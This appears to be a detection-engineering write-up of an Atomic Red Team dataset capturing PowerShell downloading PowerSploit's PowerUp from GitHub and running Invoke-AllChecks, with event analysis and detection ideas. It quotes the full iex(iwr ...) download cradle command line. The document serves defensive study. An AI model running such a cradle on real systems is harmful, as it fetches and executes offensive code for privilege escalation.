# T1059.001-19: PowerShell — PowerUp Invoke-AllChecks

## Technique Context

T1059.001 covers PowerShell-based execution. This test exercises a specific and widely deployed post-exploitation pattern: downloading a PowerShell module from GitHub via an inline `iex(iwr ...)` download cradle, then immediately invoking a function from it. The module is PowerUp from the PowerSploit framework, and the function called is `Invoke-AllChecks`, which performs a comprehensive local privilege escalation assessment. It enumerates unquoted service paths, world-writable service binaries, auto-elevating registry keys, `AlwaysInstallElevated` policy, unattended install files containing credentials, and other common misconfigurations.

PowerUp's `Invoke-AllChecks` is a significant detection target because real attackers use it frequently and it generates a distinctive behavioral signature: a PowerShell process downloading a script from a well-known URL, followed by bulk service enumeration, WMI queries, registry reads, and file system access within a short time window. When all of that activity flows from a single `iex(iwr ...)` invocation, the combination of network download and subsequent local reconnaissance is a strong compound indicator.

In defended environments, Defender intercepts the download and terminates the process with `STATUS_ACCESS_DENIED` before any of the AllChecks logic executes. This dataset captures the undefended case, where the download succeeds and PowerUp runs.

## What This Dataset Contains

Security EID 4688 shows the child PowerShell process (PID 0x1a54, parent 0x1624) with the full download-cradle command line:

```
"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)
Invoke-AllChecks}
```

This is a high-fidelity artifact: the URL pinned to a specific commit hash, the explicit TLS 1.2 negotiation, and the immediate `Invoke-AllChecks` call all appear in a single processCreate event. Two `whoami.exe` children of PowerShell are also captured in EID 4688.

The PowerShell channel has 96 events (93 EID 4104). The sampled 4104 blocks include test framework overhead (`Import-Module 'C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1' -Force`, `$ErrorActionPreference = 'Continue'`, cleanup runner). The 93 script blocks span the download-and-execute operation; the specific PowerUp function definitions and AllChecks output are present in the full dataset though not in the sample.

Sysmon contributes 22 events across EIDs 7, 11, 1, 10, 17, and 8. EID 1 captures two `whoami.exe` processes (PIDs 5964 and 1544) with `User: NT AUTHORITY\SYSTEM`. EID 8 shows PowerShell (PID 5668) creating a remote thread in an unknown process (PID 6740, `TargetImage: <unknown process>`), flagged as `technique_id=T1055,technique_name=Process Injection` — the same ART test framework artifact seen across the PowerShell test series. EID 10 shows full-access handle opens (0x1FFFFF) from PowerShell to the child processes. EID 11 produces 8 file-creation events, all from `iexplore.exe` (PID 1880) and `IEXPLORE.EXE` (PID 5544) writing to `CryptnetUrlCache` under `C:\Windows\System32\config\systemprofile\AppData\LocalLow\Microsoft\CryptnetUrlCache\` — the browser-based certificate revocation cache being populated as part of the TLS handshake for the GitHub download, a genuine side-effect artifact of the network operation.

The Application log (EID 15) records: "Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON" — this is the ART test framework re-enabling Defender's status reporting after the test, not an indication Defender was running during execution.

Compared to the defended version (25 sysmon, 9 security, 42 powershell events with an 0xC0000022 exit), this dataset shows 22 sysmon, 3 security, and 96 powershell events. The total event counts are similar in scale but the defended version was blocked before the download, while this version completes the download and runs AllChecks. The most significant new evidence is the `CryptnetUrlCache` file creation trail from Internet Explorer, documenting the TLS certificate chain validation performed when PowerShell fetched the remote script.

## What This Dataset Does Not Contain

The samples do not include the PowerUp module's function definitions or the output of `Invoke-AllChecks`. The actual privilege escalation check results — service enumeration, registry reads, file permission assessments — are present in the full dataset's 93 EID 4104 blocks but not visible in the 20 sampled events. There are no Sysmon EID 3 network connection events; the sysmon-modular configuration used here does not capture outbound connections by default, so the HTTP request to `raw.githubusercontent.com` is not directly recorded (only inferred from the CryptnetUrlCache artifact).

No DNS query events (EID 22) appear. No registry modification events from PowerUp's assessment of auto-elevate keys. The WMI queries that PowerUp uses for service enumeration do not appear as discrete events in this dataset — WMI activity is not captured by the channel configuration.

## Assessment

This is a well-formed dataset for download-cradle detection scenarios. The EID 4688 command line contains the full URL, TLS protocol negotiation, and function name in a single event. The `CryptnetUrlCache` file-creation trail provides an indirect network indicator even without EID 3. The PowerShell channel's 93 script blocks, while not fully sampled here, contain the full PowerUp source code as it was fetched and executed — valuable for content-based detectors that scan 4104 bodies for function definitions.

## Detection Opportunities Present in This Data

1. EID 4688 command line containing `iex(iwr https://raw.githubusercontent.com/` — the canonical download-cradle pattern with a specific GitHub URL, detectable as a literal string in the ProcessCommandLine field.
2. EID 4688 containing `[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12` immediately before a download cradle — explicit TLS negotiation preceding a remote execution is a common attacker pattern.
3. EID 4688 containing `Invoke-AllChecks` — a known tool name in a command line derived from a download operation.
4. Sysmon EID 8 from `powershell.exe` to `<unknown process>` — CreateRemoteThread with unresolved target, consistent across this test series.
5. Sysmon EID 11 with `Image: C:\Program Files\Internet Explorer\iexplore.exe` and `TargetFilename` containing `CryptnetUrlCache` — Internet Explorer's certificate cache being written during a TLS session initiated by PowerShell, linking the browser process to the PowerShell download cradle.
6. Sysmon EID 10 `GrantedAccess: 0x1FFFFF` from PowerShell to `whoami.exe` — full-access handles on discovery tools from a PowerShell parent.
7. EID 4688 showing `powershell.exe` spawning `whoami.exe` as a direct child during an execution that also involves a network download — the pairing of network fetch and identity verification.
